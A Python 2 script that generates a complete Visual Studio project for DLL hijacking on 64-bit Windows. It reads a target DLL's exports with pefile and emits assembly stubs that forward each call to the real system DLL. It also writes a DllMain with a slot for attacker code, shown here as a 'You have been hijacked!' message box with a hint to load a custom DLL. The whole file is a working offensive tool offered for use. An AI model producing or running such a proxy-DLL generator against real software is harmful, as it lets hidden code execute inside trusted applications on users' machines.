#!/usr/bin/python
#coding=utf-8

import os
import pefile


def make(dllname, gen_folder, symbols):
    os.mkdir(gen_folder)
    dllmain = '''
#include "TEMPLATE_HEAD.h"

TCHAR tzPath[MAX_PATH];
HMODULE sysdll;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		GetSystemDirectory(tzPath, MAX_PATH);
		lstrcat(tzPath, TEXT("\\\\TEMPLATE_DLL_NAME"));
		sysdll = LoadLibrary(tzPath);
		TEMPLATE_GETPROCADDR
		/***Do what you want here,for example:(If U want to do more thing, U'd better load your custom DLL here)***/
		MessageBoxA(NULL,"You have been hijacked!",NULL,NULL);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


'''
    get_proc_addr = ''
    for sym in symbols:
        get_proc_addr += '''g_%s = GetProcAddress(sysdll, "%s");\n\t\t''' % (sym.name, sym.name)

    cpp = open(gen_folder + '\\' + 'dllmain.cpp', "w+")
    cpp.writelines(dllmain
        .replace('TEMPLATE_DLL_NAME', dllname)
        .replace('TEMPLATE_GETPROCADDR', get_proc_addr)
        .replace('TEMPLATE_HEAD',dllname))
    cpp.close()

    export_text = '''LIBRARY\nEXPORTS\n\n'''
    for sym in symbols:
        export_text += '''%s=Fake%s @%d\n''' % (sym.name, sym.name, sym.ordinal)
    export = open(gen_folder + '\Source.def', "w+")
    export.writelines(export_text)
    export.close()

    asm = open(gen_folder + '\\' + dllname+'.asm', "w+")
    for sym in symbols:
        asm.writelines('''extern g_%s: DQ\n''' % sym.name)
    asm.writelines('''\n.code\n''')
    for sym in symbols:
        asm.writelines('''Fake%s proc
        jmp g_%s\nFake%s endp\n''' % (sym.name, sym.name, sym.name))
    asm.writelines('end')
    asm.close()

    head = open(gen_folder + '\\' + dllname + '.h',"w+")
    head.writelines('''#pragma once\n#include <Windows.h>\nextern "C" {\n''')
    for sym in symbols:
        head.writelines('''\tFARPROC g_%s;\n''' % sym.name)
    head.writelines('}')
    head.close()

    sln = open(gen_folder + '\\' + dllname + '.sln', "w+")
    sln.writelines('''Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 15
VisualStudioVersion = 15.0.27703.2035
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "TEMPLATE_DLLNAME", "TEMPLATE_DLLNAME.vcxproj", "{B8A85411-5792-48D1-9486-1FED28E707A4}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Release|x64 = Release|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{B8A85411-5792-48D1-9486-1FED28E707A4}.Release|x64.ActiveCfg = Release|x64
		{B8A85411-5792-48D1-9486-1FED28E707A4}.Release|x64.Build.0 = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {E3A9E085-92D5-4F03-A485-1FCD5190678D}
	EndGlobalSection
EndGlobal
'''.replace('TEMPLATE_DLLNAME', dllname).replace('TEMPLATE_DLLNAME', dllname))
    sln.close()

    setting = open(gen_folder + '\\' + dllname + '.vcxproj', "w+")
    setting.writelines('''<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{B8A85411-5792-48D1-9486-1FED28E707A4}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>msimg32</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17134.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
    <UseOfMfc>false</UseOfMfc>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings" />
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;MSIMG32_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <ModuleDefinitionFile>Source.def</ModuleDefinitionFile>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="TEMPLATE_DLLNAME.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="dllmain.cpp" />
  </ItemGroup>
  <ItemGroup>
    <CustomBuild Include="TEMPLATE_DLLNAME.asm">
      <ExcludedFromBuild Condition="'$(Configuration)|$(Platform)'=='Release|x64'">false</ExcludedFromBuild>
      <FileType>Document</FileType>
      <Command Condition="'$(Configuration)|$(Platform)'=='Release|x64'">ml64 /Fo $(IntDir)%(fileName).obj /c %(fileName).asm</Command>
      <Outputs Condition="'$(Configuration)|$(Platform)'=='Release|x64'">$(IntDir)%(fileName).obj</Outputs>
    </CustomBuild>
  </ItemGroup>
  <ItemGroup>
    <None Include="Source.def" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets" />
</Project>'''.replace('TEMPLATE_DLLNAME', dllname).replace('TEMPLATE_DLLNAME', dllname))

    filters = open(gen_folder + '\\' + dllname + '.vcxproj.filters', "w+")
    filters.writelines('''<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="源文件">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="头文件">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="资源文件">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="TEMPLATE_DLLNAME.h">
      <Filter>头文件</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="dllmain.cpp">
      <Filter>源文件</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="Source.def">
      <Filter>源文件</Filter>
    </None>
  </ItemGroup>
  <ItemGroup>
    <CustomBuild Include="TEMPLATE_DLLNAME.asm">
      <Filter>源文件</Filter>
    </CustomBuild>
  </ItemGroup>
</Project>'''.replace('TEMPLATE_DLLNAME', dllname).replace('TEMPLATE_DLLNAME', dllname))


print('Input the full path of the dll you want to hijack')
filepath = raw_input()
pe = pefile.PE(filepath)
is_32bit = pe.FILE_HEADER.Characteristics & 0x100
if is_32bit != 0:
    print('This is a 32bit dll, please use 64bit dll')
    exit(-1)
symbols = pe.DIRECTORY_ENTRY_EXPORT.symbols
dllname = os.path.basename(os.path.splitext(filepath)[0])
folder = os.getcwd() + '\\' + dllname

print 'Output folder: ' + folder
print 'Export proc count: ' + str(len(symbols))

make(dllname, folder, symbols)
print('You have successfully generated a dllhijack project of '+dllname)

